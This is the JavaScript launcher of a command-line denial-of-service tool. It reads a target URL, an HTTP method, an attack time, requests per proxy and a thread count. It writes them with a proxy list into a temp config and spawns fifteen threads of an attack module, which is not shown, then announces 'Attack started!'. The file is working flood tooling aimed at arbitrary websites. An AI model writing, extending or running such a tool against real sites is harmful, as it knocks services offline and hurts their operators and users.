const fs = require('fs')
const { Command } = require('commander')

const log = require('./modules/logger')
const thread = require('./modules/threads')

var temp = `${__dirname}\\temp.json`

log.banner()

const program = new Command()

program.version('1.0.0')

program.option('-u, --url <link>', 'target url')
program.option('-m, --method <GET, POST>', 'attack method')
program.option('-t, --time <length>', 'attack time')
program.option('-r, --reqs <length>', 'req per proxy connection')
program.option('-th, --threads <length>', 'threads per attack')

program.parse(process.argv)

if (!program.url || !program.method || !program.time || !program.reqs || !program.threads) 
    return log.error('you lacked to define something!')

if (fs.existsSync(temp))
    fs.unlinkSync(temp)

fs.writeFile(temp, `{ "proxies": "proxy.txt", "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs} }`, function (err) 
{
    if (err)
        return log.error('error on create temp.json.')

    for (var i = 0; i < 15; i++) 
    {
        thread.CreateThread(`${__dirname}\\modules\\attack.js`)
    }

    log.success("Attack started!")
})